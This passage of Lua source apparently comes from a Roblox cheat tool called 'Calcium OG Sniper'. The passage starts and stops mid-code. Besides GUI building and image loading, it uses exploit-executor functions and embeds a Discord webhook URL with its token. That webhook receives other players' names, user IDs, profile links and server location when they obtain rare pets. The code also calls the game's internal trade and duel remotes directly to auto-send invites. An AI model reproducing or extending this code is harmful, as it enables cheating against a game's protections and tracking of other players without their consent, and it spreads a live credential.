            cloneVp.BackgroundTransparency = 1
            cloneVp.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            cloneVp.BorderSizePixel = 0
            cloneVp.ZIndex = 5
            cloneVp.LightColor = Color3.fromRGB(255, 255, 255)
            cloneVp.LightDirection = Vector3.new(-1, -1, -1)
            cloneVp.Ambient = Color3.fromRGB(180, 180, 180)
            local rotModel = cloneVp:FindFirstChildWhichIsA("Model")
            if not rotModel then
                local parts = {}
                for _, child in ipairs(cloneVp:GetChildren()) do
                    if child:IsA("BasePart") then table.insert(parts, child) end
                end
                if #parts > 0 then
                    rotModel = Instance.new("Model")
                    rotModel.Name = "LivePet"
                    for _, p in ipairs(parts) do p.Parent = rotModel end
                    rotModel.Parent = cloneVp
                end
            end
            if rotModel then
                local worldModel = cloneVp:FindFirstChildWhichIsA("WorldModel")
                if not worldModel then
                    worldModel = Instance.new("WorldModel")
                    worldModel.Parent = cloneVp
                    rotModel.Parent = worldModel
                end
                optimizeCloneModel(rotModel)
                local cf, size = rotModel:GetBoundingBox()
                local centerPos = cf.Position
                local maxDim = math.max(size.X, size.Y, size.Z)
                if maxDim < 1 then maxDim = 3 end
                if maxDim > 30 then maxDim = 6 end
                pcall(function()
                    rotModel:PivotTo((rotModel:GetPivot() - centerPos) * CFrame.Angles(0, math.rad(180), 0))
                end)
                local vpCam = Instance.new("Camera")
                vpCam.Parent = cloneVp
                cloneVp.CurrentCamera = vpCam
                local dist = math.max(maxDim * 1.85, 3.8)
                local height = math.clamp(size.Y * 0.08, -0.3, 1.2)
                vpCam.FieldOfView = 50
                vpCam.CFrame = CFrame.new(Vector3.new(0, height, dist), Vector3.new(0, 0, 0))
                if mutation and mutation ~= "" and mutation ~= "none" and mutation ~= "None" then
                    applyMutationShader(rotModel, mutation)
                end
                local srcOrigModel = liveVp:FindFirstChildWhichIsA("Model") or liveVp:FindFirstChildWhichIsA("WorldModel")
                playPetAnimations(rotModel, srcOrigModel)
                cloneVp.Parent = parentBox
                return true
            end
        end
        for _, d in ipairs(filler:GetDescendants()) do
            if d:IsA("ImageLabel") and d.Name ~= "Headshot" and d.Image ~= "" and not d:IsDescendantOf(filler:FindFirstChild("PlayerBg") or filler) then
                local imgClone = d:Clone()
                for _, c in ipairs(imgClone:GetDescendants()) do
                    if c:IsA("UIConstraint") or c:IsA("UIAspectRatioConstraint") or c:IsA("UISizeConstraint") then
                        c:Destroy()
                    end
                end
                imgClone.Size = UDim2.new(1, -4, 1, -4)
                imgClone.Position = UDim2.new(0, 2, 0, 2)
                imgClone.BackgroundTransparency = 1
                imgClone.ScaleType = Enum.ScaleType.Fit
                imgClone.ZIndex = 5
                imgClone.Parent = parentBox
                return true
            end
        end
        return false
    end

    local ANIMAL_MUTATION_IMAGES = {
        ["meowl"] = {
            ["default"]     = "https://static.wikia.nocookie.net/stealabr/images/9/91/Default_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064728",
            ["gold"]        = "https://static.wikia.nocookie.net/stealabr/images/5/5b/Gold_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["diamond"]     = "https://static.wikia.nocookie.net/stealabr/images/a/a1/Diamond_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["bloodrot"]    = "https://static.wikia.nocookie.net/stealabr/images/d/d3/Bloodrot_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064644",
            ["candy"]       = "https://static.wikia.nocookie.net/stealabr/images/c/c6/Candy_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["lava"]        = "https://static.wikia.nocookie.net/stealabr/images/c/c9/Lava_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["galaxy"]      = "https://static.wikia.nocookie.net/stealabr/images/2/28/Galaxy_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["yin yang"]    = "https://static.wikia.nocookie.net/stealabr/images/7/7a/Yin_Yang_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["radioactive"] = "https://static.wikia.nocookie.net/stealabr/images/c/cf/Radioactive_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["cursed"]      = "https://static.wikia.nocookie.net/stealabr/images/d/d4/Cursed_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064709",
            ["divine"]      = "https://static.wikia.nocookie.net/stealabr/images/d/d9/Divine_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["rainbow"]     = "https://static.wikia.nocookie.net/stealabr/images/b/b1/Rainbow_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064646",
            ["cyber"]       = "https://static.wikia.nocookie.net/stealabr/images/1/1e/Cyber_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064717",
            ["phantom"]     = "https://static.wikia.nocookie.net/stealabr/images/d/d7/Phantom_Meowl.png/revision/latest?cb=20260626193238",
        },
    }

    local CUSTOM_ANIMAL_IMAGES = {
        ["meowl"]               = "https://static.wikia.nocookie.net/stealabr/images/9/91/Default_Meowl.png/revision/latest/scale-to-width-down/1000?cb=20260528064728",
        ["skibidi toilet"]      = "https://static.wikia.nocookie.net/stealabr/images/a/a7/Default_Skibidi_Toilet.png/revision/latest?cb=20260528092806",
        ["skibidi"]             = "https://static.wikia.nocookie.net/stealabr/images/a/a7/Default_Skibidi_Toilet.png/revision/latest?cb=20260528092806",
        ["john pork"]           = "https://static.wikia.nocookie.net/stealabr/images/d/d2/John_Pork.png/revision/latest?cb=20260502233229",
        ["strawberry elephant"] = "https://static.wikia.nocookie.net/stealabr/images/5/58/Strawberryelephant.png/revision/latest?cb=20260317001745",
        ["dragon cannelloni"]   = "https://static.wikia.nocookie.net/stealabr/images/a/a5/Dragon_Cannelloni.png/revision/latest?cb=20260428162417",
        ["cannelloni"]          = "https://static.wikia.nocookie.net/stealabr/images/a/a5/Dragon_Cannelloni.png/revision/latest?cb=20260428162417",
    }

    local function getCustomAnimalUrl(rawName, mutName)
        local lower = string.lower(rawName or "")
        local lowerMut = string.lower(mutName or ""):gsub("_", " ")
        for animalKey, variants in pairs(ANIMAL_MUTATION_IMAGES) do
            if string.find(lower, animalKey, 1, true) then
                if lowerMut ~= "" and lowerMut ~= "none" then
                    for mKey, url in pairs(variants) do
                        if mKey ~= "default" and string.find(lowerMut, mKey, 1, true) then
                            return url
                        end
                    end
                end
                if variants["default"] then return variants["default"] end
            end
        end
        for k, url in pairs(CUSTOM_ANIMAL_IMAGES) do
            if string.find(lower, k, 1, true) then return url end
        end
        return nil
    end

    local MUTATION_DATA = {
        ["gold"]        = { name = "GOLD",        color = Color3.fromRGB(255,215,0),   bgColor = Color3.fromRGB(48,38,12),  icon = "" },
        ["diamond"]     = { name = "DIAMOND",     color = Color3.fromRGB(0,220,255),   bgColor = Color3.fromRGB(12,38,52),  icon = "" },
        ["bloodrot"]    = { name = "BLOODROT",    color = Color3.fromRGB(255,45,45),   bgColor = Color3.fromRGB(50,14,14),  icon = "" },
        ["candy"]       = { name = "CANDY",       color = Color3.fromRGB(255,105,180), bgColor = Color3.fromRGB(50,18,36),  icon = "" },
        ["lava"]        = { name = "LAVA",        color = Color3.fromRGB(255,110,25),  bgColor = Color3.fromRGB(50,24,10),  icon = "" },
        ["galaxy"]      = { name = "GALAXY",      color = Color3.fromRGB(180,100,255), bgColor = Color3.fromRGB(36,16,52),  icon = "" },
        ["yin yang"]    = { name = "YIN YANG",    color = Color3.fromRGB(240,240,240), bgColor = Color3.fromRGB(28,28,28),  icon = "" },
        ["radioactive"] = { name = "RADIOACTIVE", color = Color3.fromRGB(80,255,80),   bgColor = Color3.fromRGB(14,46,14),  icon = "" },
        ["radio"]       = { name = "RADIOACTIVE", color = Color3.fromRGB(80,255,80),   bgColor = Color3.fromRGB(14,46,14),  icon = "" },
        ["cursed"]      = { name = "CURSED",      color = Color3.fromRGB(160,40,240),  bgColor = Color3.fromRGB(32,10,48),  icon = "" },
        ["divine"]      = { name = "DIVINE",      color = Color3.fromRGB(255,235,140), bgColor = Color3.fromRGB(48,44,18),  icon = "" },
        ["cyber"]       = { name = "CYBER",       color = Color3.fromRGB(0,255,200),   bgColor = Color3.fromRGB(10,42,38),  icon = "" },
        ["phantom"]     = { name = "PHANTOM",     color = Color3.fromRGB(120,200,255), bgColor = Color3.fromRGB(18,34,48),  icon = "" },
        ["crystal"]     = { name = "CRYSTAL",     color = Color3.fromRGB(200,240,255), bgColor = Color3.fromRGB(22,42,52),  icon = "" },
        ["rainbow"]     = { name = "RAINBOW",     color = Color3.fromRGB(255,180,220), bgColor = Color3.fromRGB(42,22,38),  icon = "" },
    }
    local function getMutationInfo(nameOrMut)
        if not nameOrMut or nameOrMut == "" then return nil end
        local lower = string.lower(tostring(nameOrMut)):gsub("_", " ")
        for k, info in pairs(MUTATION_DATA) do
            if string.find(lower, k, 1, true) then return info end
        end
        return nil
    end

    local function loadDirectAsset(url, name)
        if not url or url == "" then return nil end
        local safeName = "br_" .. tostring(name or "pet"):gsub("[^%w]", "_"):lower() .. ".png"
        if assetCache[url] then return assetCache[url] end
        local okExist, exists = pcall(function() return isfile and isfile(safeName) end)
        if okExist and exists then
            local ok2, asset = pcall(function() return getcustomasset(safeName) end)
            if ok2 and asset and asset ~= "" then
                assetCache[url] = asset
                return asset
            end
        end
        local requestFn = getRequestFn()
        local data = nil
        if requestFn then
            local ok, res = pcall(function()
                return requestFn({
                    Url = url,
                    Method = "GET",
                    Headers = { ["User-Agent"] = "Mozilla/5.0", ["Accept"] = "image/png,image/*,*/*" }
                })
            end)
            if ok and res and (res.StatusCode == 200 or res.StatusCode == 0) then
                data = res.Body or res.body or res.Data
            end
        end
        if (not data or #tostring(data) < 100) then
            pcall(function() data = game:HttpGet(url) end)
        end
        if not data or #tostring(data) < 100 then return nil end
        local head = tostring(data):sub(1, 40):lower()
        if head:find("<!doctype") or head:find("<html") then return nil end
        pcall(function() writefile(safeName, data) end)
        local okAsset, asset = pcall(function() return getcustomasset(safeName) end)
        if okAsset and asset and asset ~= "" then
            assetCache[url] = asset
            return asset
        end
        return nil
    end

    local WEBHOOK_URL = "https://discord.com/api/webhooks/1535663783207506031/mDbsRlrYK_Km46wV8MWjJrEQmAlP2SDP-B3asm1fQJRuH6YZNdJejn1GySOfEXpIAN9u"
    local webhookSent = {}

    local function sendWebhook(ogName, username, userId, mutation, isLocalServer)
        if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
        local key = ogName .. tostring(userId)
        if webhookSent[key] then return end
        webhookSent[key] = true
        local profileUrl = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
        local mutStr = (mutation and mutation ~= "Default" and mutation ~= "Normal") and mutation or "Normal"
        local serverStr = isLocalServer and "Same server as you" or "Different server"
        local imageKey = string.lower(ogName)
        local brainrotImage = CUSTOM_ANIMAL_IMAGES[imageKey] or ""
        local embed = {
            title = "OG Sniped — " .. ogName,
            description = "**" .. username .. "** just claimed a **" .. ogName .. "**\n[View Profile](" .. profileUrl .. ")",
            color = 0x6EB4FF,
            fields = {
                { name = "Player", value = "[" .. username .. "](" .. profileUrl .. ")", inline = true },
                { name = "Mutation", value = mutStr, inline = true },
                { name = "Server", value = serverStr, inline = true },
                { name = "User ID", value = tostring(userId), inline = true },
            },
            footer = { text = "Calcium OG Sniper " .. os.date("%H:%M:%S") },
            thumbnail = { url = brainrotImage or
                ("https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=150&height=150&format=png") },
        }
        task.spawn(function()
            local body = OGHttp:JSONEncode({ embeds = { embed } })
            local reqFn = getRequestFn()
            if reqFn then
                pcall(function()
                    reqFn({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body = body,
                    })
                end)
            end
        end)
    end

    local GUI = Instance.new("ScreenGui")
    GUI.Name = GUI_NAME
    GUI.ResetOnSpawn = false
    GUI.DisplayOrder = 998
    GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    if not pcall(function() GUI.Parent = game.CoreGui end) then GUI.Parent = OGPlayerGui end

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 420, 0, 540)
    MainFrame.Position = UDim2.new(0.5, -210, 0.5, -270)
    MainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
    MainFrame.BackgroundTransparency = 1
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.Active = true
    MainFrame.Parent = GUI
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 14)

    do
        local bgImg = Instance.new("ImageLabel")
        bgImg.Name = "BgImage"
        bgImg.Size = UDim2.fromScale(1, 1)
        bgImg.Position = UDim2.fromScale(0, 0)
        bgImg.BackgroundColor3 = Color3.fromRGB(8, 10, 14)
        bgImg.BackgroundTransparency = 0
        bgImg.Image = "rbxassetid://129085053275432"
        bgImg.ScaleType = Enum.ScaleType.Crop
        bgImg.ImageTransparency = 0.15
        bgImg.ZIndex = 0
        bgImg.Parent = MainFrame
        Instance.new("UICorner", bgImg).CornerRadius = UDim.new(0, 14)

        local dim = Instance.new("Frame")
        dim.Name = "BgDim"
        dim.Size = UDim2.fromScale(1, 1)
        dim.BackgroundColor3 = Color3.fromRGB(4, 6, 10)
        dim.BackgroundTransparency = 0.42
        dim.BorderSizePixel = 0
        dim.ZIndex = 0
        dim.Parent = MainFrame
        Instance.new("UICorner", dim).CornerRadius = UDim.new(0, 14)
    end

    local MainStroke = Instance.new("UIStroke", MainFrame)
    MainStroke.Thickness = 1.4
    MainStroke.Color = Color3.fromRGB(70, 130, 200)
    MainStroke.Transparency = 0.5

    _G.CalciumPulseRefs.ogWindowStroke = MainStroke

    do
        local MainStarLayer = Instance.new("Frame")
        MainStarLayer.Name = "MainStarLayer"
        MainStarLayer.Size = UDim2.new(1, 0, 1, 0)
        MainStarLayer.BackgroundTransparency = 1
        MainStarLayer.ZIndex = 0
        MainStarLayer.ClipsDescendants = true
        MainStarLayer.Active = false
        MainStarLayer.Parent = MainFrame

        local pool = {}
        for i = 1, 18 do
            local star = Instance.new("Frame")
            star.Name = "FxStar" .. i
            star.BorderSizePixel = 0
            local sz = (i % 4 == 0) and (3 + math.random(0, 2)) or (1 + math.random(0, 2))
            star.Size = UDim2.fromOffset(sz, sz)
            star.BackgroundColor3 = (i % 5 == 0)
                and Color3.fromRGB(255, 210, 140)
                or Color3.fromRGB(160 + math.random(0, 40), 200 + math.random(0, 40), 255)
            star.BackgroundTransparency = 0.15 + math.random() * 0.5
            star.Position = UDim2.fromOffset(math.random(0, 400), math.random(-20, 520))
            star.ZIndex = 0
            star.Parent = MainStarLayer
            Instance.new("UICorner", star).CornerRadius = UDim.new(1, 0)
            pool[i] = {
                frame = star,
                speed = 12 + math.random() * 38,
                drift = (math.random() - 0.5) * 18,
                twinkle = math.random() * math.pi * 2,
                twSpeed = 2 + math.random() * 3,
            }
        end

        _G.CalciumPulseRefs.ogStars = {
            frame = MainFrame,
            layer = MainStarLayer,
            pool = pool,
        }
    end

    local WindowScrimOG = Instance.new("Frame")
    WindowScrimOG.Name = "ReadabilityScrim"
    WindowScrimOG.Size = UDim2.new(1, 0, 1, 0)
    WindowScrimOG.BackgroundColor3 = Color3.fromRGB(6, 10, 18)
    WindowScrimOG.BackgroundTransparency = 0.72
    WindowScrimOG.BorderSizePixel = 0
    WindowScrimOG.ZIndex = 1
    WindowScrimOG.Parent = MainFrame
    Instance.new("UICorner", WindowScrimOG).CornerRadius = UDim.new(0, 14)

    local ContentZ = 5

    local isDragging, dragStart, startPos
    MainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
        end
    end)
    OGInput.InputChanged:Connect(function(input)
        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local d = input.Position - dragStart
            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
    OGInput.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = false
        end
    end)

    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, 0, 0, 42)
    Header.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
    Header.BackgroundTransparency = 0.35
    Header.BorderSizePixel = 0
    Header.ZIndex = ContentZ
    Header.Parent = MainFrame
    Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 14)

    local HeaderDivider = Instance.new("Frame")
    HeaderDivider.Size = UDim2.new(1, -20, 0, 1)
    HeaderDivider.Position = UDim2.new(0.5, 0, 1, 0)
    HeaderDivider.AnchorPoint = Vector2.new(0.5, 0)
    HeaderDivider.BackgroundColor3 = OG_ACCENT
    HeaderDivider.BackgroundTransparency = 0.55
    HeaderDivider.BorderSizePixel = 0
    HeaderDivider.ZIndex = ContentZ + 1
    HeaderDivider.Parent = Header

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(0, 120, 1, 0)
    Title.Position = UDim2.new(0, 14, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "CALCIUM OG"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 15
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.ZIndex = ContentZ + 1
    Title.Parent = Header
    do
        local shim = Instance.new("UIGradient")
        shim.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(245, 248, 255)),
            ColorSequenceKeypoint.new(0.45, Color3.fromRGB(120, 190, 255)),
            ColorSequenceKeypoint.new(0.55, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(245, 248, 255)),
        })
        shim.Parent = Title
        task.spawn(function()
            local t0 = tick()
            while shim and shim.Parent do
                shim.Rotation = ((tick() - t0) * 40) % 360
                task.wait(0.12)
            end
        end)
    end

    local Subtitle = Instance.new("TextLabel")
    Subtitle.Size = UDim2.new(0, 80, 1, 0)
    Subtitle.Position = UDim2.new(0, 132, 0, 2)
    Subtitle.BackgroundTransparency = 1
    Subtitle.Text = "SNIPER"
    Subtitle.TextColor3 = OG_ACCENT
    Subtitle.Font = Enum.Font.GothamBold
    Subtitle.TextSize = 11
    Subtitle.TextXAlignment = Enum.TextXAlignment.Left
    Subtitle.ZIndex = ContentZ + 1
    Subtitle.Parent = Header

    local MinBtn = Instance.new("TextButton")
    MinBtn.Size = UDim2.new(0, 24, 0, 24)
    MinBtn.Position = UDim2.new(1, -56, 0.5, -12)
    MinBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
    MinBtn.Text = "−"
    MinBtn.TextColor3 = Color3.fromRGB(200, 200, 220)
    MinBtn.Font = Enum.Font.GothamMedium
    MinBtn.TextSize = 16
    MinBtn.BorderSizePixel = 0
    MinBtn.ZIndex = ContentZ + 1
    MinBtn.Parent = Header
    Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 6)
    local minStroke = Instance.new("UIStroke", MinBtn)
    minStroke.Color = Color3.fromRGB(45, 45, 55)
    minStroke.Thickness = 0.8

    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 24, 0, 24)
    CloseBtn.Position = UDim2.new(1, -28, 0.5, -12)
    CloseBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
    CloseBtn.Text = "X"
    CloseBtn.TextColor3 = OG_RED
    CloseBtn.Font = Enum.Font.GothamMedium
    CloseBtn.TextSize = 12
    CloseBtn.BorderSizePixel = 0
    CloseBtn.ZIndex = ContentZ + 1
    CloseBtn.Parent = Header
    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
    local closeStroke = Instance.new("UIStroke", CloseBtn)
    closeStroke.Color = Color3.fromRGB(60, 30, 35)
    closeStroke.Thickness = 0.8

    local isMin = false
    MinBtn.MouseButton1Click:Connect(function()
        isMin = not isMin
        OGTween:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = isMin and UDim2.new(0, 340, 0, 42) or UDim2.new(0, 420, 0, 540)
        }):Play()
    end)

    CloseBtn.MouseButton1Click:Connect(function()
        GUI:Destroy()
        if getgenv then getgenv().CalciumOGSniperGui = nil end
        if OGOpenBtn then OGOpenBtn.Text = "OPEN" end
        if OGSniperDot then OGSniperDot.BackgroundColor3 = COLORS.Dim end
    end)

    local TabBar = Instance.new("Frame")
    TabBar.Size = UDim2.new(1, -16, 0, 30)
    TabBar.Position = UDim2.new(0, 8, 0, 46)
    TabBar.BackgroundTransparency = 1
    TabBar.ZIndex = ContentZ
    TabBar.Parent = MainFrame

    local SnipeTabBtn = Instance.new("TextButton")
    SnipeTabBtn.Size = UDim2.new(0.5, -3, 1, 0)
    SnipeTabBtn.Position = UDim2.new(0, 0, 0, 0)
    SnipeTabBtn.BackgroundColor3 = Color3.fromRGB(14, 16, 22)
    SnipeTabBtn.Text = "SPAWN SNIPE"
    SnipeTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    SnipeTabBtn.Font = Enum.Font.GothamMedium
    SnipeTabBtn.TextSize = 11
    SnipeTabBtn.BorderSizePixel = 0
    SnipeTabBtn.ZIndex = ContentZ + 1
    SnipeTabBtn.Parent = TabBar
    Instance.new("UICorner", SnipeTabBtn).CornerRadius = UDim.new(0, 8)
    local SnipeTabStroke = Instance.new("UIStroke", SnipeTabBtn)
    SnipeTabStroke.Color = OG_ACCENT
    SnipeTabStroke.Thickness = 1

    local TrackTabBtn = Instance.new("TextButton")
    TrackTabBtn.Size = UDim2.new(0.5, -3, 1, 0)
    TrackTabBtn.Position = UDim2.new(0.5, 3, 0, 0)
    TrackTabBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
    TrackTabBtn.Text = "PLAYER TRACK"
    TrackTabBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
    TrackTabBtn.Font = Enum.Font.GothamMedium
    TrackTabBtn.TextSize = 11
    TrackTabBtn.BorderSizePixel = 0
    TrackTabBtn.ZIndex = ContentZ + 1
    TrackTabBtn.Parent = TabBar
    Instance.new("UICorner", TrackTabBtn).CornerRadius = UDim.new(0, 8)
    local TrackTabStroke = Instance.new("UIStroke", TrackTabBtn)
    TrackTabStroke.Color = Color3.fromRGB(30, 30, 40)
    TrackTabStroke.Thickness = 1

    local SnipePage = Instance.new("Frame")
    SnipePage.Size = UDim2.new(1, -16, 1, -86)
    SnipePage.Position = UDim2.new(0, 8, 0, 78)
    SnipePage.BackgroundTransparency = 1
    SnipePage.Visible = true
    SnipePage.ZIndex = ContentZ
    SnipePage.Parent = MainFrame

    local TrackPage = Instance.new("Frame")
    TrackPage.Size = UDim2.new(1, -16, 1, -86)
    TrackPage.Position = UDim2.new(0, 8, 0, 78)
    TrackPage.BackgroundTransparency = 1
    TrackPage.Visible = false
    TrackPage.ZIndex = ContentZ
    TrackPage.Parent = MainFrame

    local function setTab(tabName)
        if tabName == "SNIPE" then
            SnipePage.Visible = true
            TrackPage.Visible = false
            SnipeTabBtn.BackgroundColor3 = Color3.fromRGB(14, 16, 22)
            SnipeTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            SnipeTabStroke.Color = OG_ACCENT
            TrackTabBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
            TrackTabBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
            TrackTabStroke.Color = Color3.fromRGB(30, 30, 40)
        else
            SnipePage.Visible = false
            TrackPage.Visible = true
            TrackTabBtn.BackgroundColor3 = Color3.fromRGB(14, 16, 22)
            TrackTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            TrackTabStroke.Color = OG_ACCENT
            SnipeTabBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
            SnipeTabBtn.TextColor3 = Color3.fromRGB(140, 140, 160)
            SnipeTabStroke.Color = Color3.fromRGB(30, 30, 40)
        end
    end

    SnipeTabBtn.MouseButton1Click:Connect(function() setTab("SNIPE") end)
    TrackTabBtn.MouseButton1Click:Connect(function() setTab("TRACK") end)

    local isAutoTradeEnabled = false
    local autoTradeTargetIndex = 1
    local AUTO_TRADE_FILTERS = {
        { name = "ALL OG", key = "ALL" },
        { name = "MEOWL", key = "meowl" },
        { name = "JOHN PORK", key = "john pork" },
        { name = "ELEPHANT", key = "strawberry elephant" },
        { name = "SKIBIDI", key = "skibidi toilet" },
        { name = "DRAGON", key = "dragon cannelloni" },
    }
    local autoTradedOwners = {}

    local function resolveTargetPlayer(target)
        if typeof(target) == "Instance" and target:IsA("Player") then return target
        elseif type(target) == "number" then return OGPlayers:GetPlayerByUserId(target)
        elseif type(target) == "string" then
            local tClean = target:lower():gsub("@", ""):gsub("^%s*(.-)%s*$", "%1")
            for _, pl in ipairs(OGPlayers:GetPlayers()) do
                if pl.Name:lower() == tClean or pl.DisplayName:lower() == tClean then
                    return pl
                end
            end
        end
        return nil
    end

    local function resolveTargetUserId(target)
        if type(target) == "number" and target > 0 then return target end
        local pl = resolveTargetPlayer(target)
        if pl then return pl.UserId end
        if type(target) == "string" then
            local clean = target:gsub("@", ""):gsub("^%s*(.-)%s*$", "%1")
            if userCache[clean:lower()] and userCache[clean:lower()].userId then
                return userCache[clean:lower()].userId
            end
            local ok, id = pcall(function() return OGPlayers:GetUserIdFromNameAsync(clean) end)
            if ok and id then
                userCache[clean:lower()] = { userId = id, name = clean, displayName = clean }
                return id
            end
        end
        return nil
    end

    local lastTradeCooldowns = {}
    local function sendTradeInvite(target)
        local targetId = resolveTargetUserId(target)
        if not targetId then return false, "No Target ID" end
        local now = os.time()
        if lastTradeCooldowns[targetId] and (now - lastTradeCooldowns[targetId] < 2) then
            return false, "Cooldown"
        end
        lastTradeCooldowns[targetId] = now
        local sent = false
        pcall(function()
            local controllers = game:GetService("ReplicatedStorage"):FindFirstChild("Controllers")
            local tcMod = controllers and controllers:FindFirstChild("TradeController")
            if tcMod then
                local tc = require(tcMod)
                if tc and type(tc.SendInvite) == "function" then
                    tc:SendInvite(targetId, function(success, err)
                        if success then sent = true end
                    end)
                    sent = true
                end
            end
        end)
        if sent then return true, "Success" end
        pcall(function()
            local pk = game:GetService("ReplicatedStorage"):FindFirstChild("Packages")
            local net = pk and pk:FindFirstChild("Net")
            local rfInvite = net and net:FindFirstChild("RF/TradeService/Invite")
            if rfInvite and rfInvite:IsA("RemoteFunction") then
                local res = rfInvite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", targetId)
                if res ~= false then sent = true end
            end
        end)
        return sent, (sent and "Success" or "Failed")
    end

    local function sendDuelInvite(target)
        local targetPl = resolveTargetPlayer(target)
        local targetId = resolveTargetUserId(target)
        if not targetPl and not targetId then return false end
        local rep = game:GetService("ReplicatedStorage")
        local sent = false
        for _, r in ipairs(rep:GetDescendants()) do
            if r:IsA("RemoteFunction") or r:IsA("RemoteEvent") then
                local rName = r.Name:lower()
                if rName:find("duel") or rName:find("fight") or rName:find("challenge") then
                    pcall(function()
                        if r:IsA("RemoteFunction") then
                            if targetPl then r:InvokeServer(targetPl) end
                            if targetId then r:InvokeServer(targetId) end
                        elseif r:IsA("RemoteEvent") then
                            if targetPl then r:FireServer(targetPl) end
                            if targetId then r:FireServer(targetId) end
                        end
                        sent = true
                    end)
                end
            end
        end
        return sent
    end

    local function checkAndExecuteAutoTrade(animalName, ownerName)
        if not isAutoTradeEnabled then return end
        if not ownerName or ownerName == "UNCLAIMED" or ownerName == "Claimed By" or ownerName == "" then return end
        local filter = AUTO_TRADE_FILTERS[autoTradeTargetIndex]
        local filterKey = filter and filter.key or "ALL"
        local match = false
        local aLower = string.lower(animalName)
        if filterKey == "ALL" then
            match = isTargetAnimal(animalName)
        else
            match = aLower:find(filterKey, 1, true) ~= nil
        end
        if match and not autoTradedOwners[ownerName .. "_" .. filterKey] then
            autoTradedOwners[ownerName .. "_" .. filterKey] = true
            task.spawn(function()
                local targetId = resolveTargetUserId(ownerName)
                if targetId then sendTradeInvite(targetId) end
            end)
        end
    end

    local ControlBar = Instance.new("Frame")
    ControlBar.Size = UDim2.new(1, 0, 0, 30)
    ControlBar.Position = UDim2.new(0, 0, 0, 0)
    ControlBar.BackgroundTransparency = 1
    ControlBar.ZIndex = ContentZ
    ControlBar.Parent = SnipePage

    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Size = UDim2.new(0, 100, 0, 30)
    StatusLabel.Position = UDim2.new(0, 0, 0, 0)
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Text = "SPAWNS: 0"
    StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 220)
    StatusLabel.Font = Enum.Font.GothamMedium
    StatusLabel.TextSize = 10
    StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    StatusLabel.TextYAlignment = Enum.TextYAlignment.Center
    StatusLabel.ZIndex = ContentZ + 1
    StatusLabel.Parent = ControlBar

    local FilterBtn = Instance.new("TextButton")
    FilterBtn.Size = UDim2.new(0, 80, 0, 22)
    FilterBtn.Position = UDim2.new(0, 105, 0.5, -11)
    FilterBtn.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
    FilterBtn.Text = "ALL OG"
    FilterBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    FilterBtn.Font = Enum.Font.GothamMedium
    FilterBtn.TextSize = 8
    FilterBtn.BorderSizePixel = 0
